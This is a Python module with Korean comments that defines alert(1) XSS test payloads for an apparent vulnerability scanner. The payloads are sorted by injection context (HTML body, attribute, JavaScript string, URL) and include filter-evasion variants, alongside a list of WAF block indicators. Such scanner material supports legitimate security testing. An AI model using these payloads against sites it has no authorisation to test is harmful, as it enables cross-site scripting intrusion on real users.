"""
XSS 페이로드 정의
컨텍스트별로 분류된 alert(1) 기반 페이로드
(취약점 존재 여부 확인 목적만, 실제 공격 페이로드 아님)
"""

# 고유 마커 (반사 여부 확인용)
MARKER = "xss7a3fmarker"

# 컨텍스트별 페이로드
PAYLOADS = {
    # HTML 본문에 반사될 때
    "html_body": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<<script>alert(1)//<</script>",
        "<script>alert(1)</script>",          # 대소문자 변형
        "<scr<script>ipt>alert(1)</scr</script>ipt>",  # 중첩
    ],

    # HTML 속성 안에 반사될 때
    # 예: <input value="[여기]">
    "html_attr": [
        '" onmouseover="alert(1)',
        '" onfocus="alert(1)" autofocus="',
        "' onmouseover='alert(1)",
        '" onclick="alert(1)',
        '"><script>alert(1)</script>',
        '" onerror="alert(1)',
    ],

    # JavaScript 문자열 안에 반사될 때
    # 예: var x = "[여기]";
    "js_string": [
        "';alert(1);//",
        '";alert(1);//',
        "\\';alert(1);//",
        "</script><script>alert(1)</script>",
        "'-alert(1)-'",
    ],

    # URL 파라미터로 반사될 때
    "url_context": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
}

# 특수문자 인코딩 여부 체크용
SPECIAL_CHARS = ["<", ">", '"', "'", "/", "\\"]

# WAF 감지용 패턴
WAF_INDICATORS = [
    "blocked",
    "forbidden",
    "waf",
    "firewall",
    "access denied",
    "security",
    "protection",
    "mod_security",
    "request rejected",
]
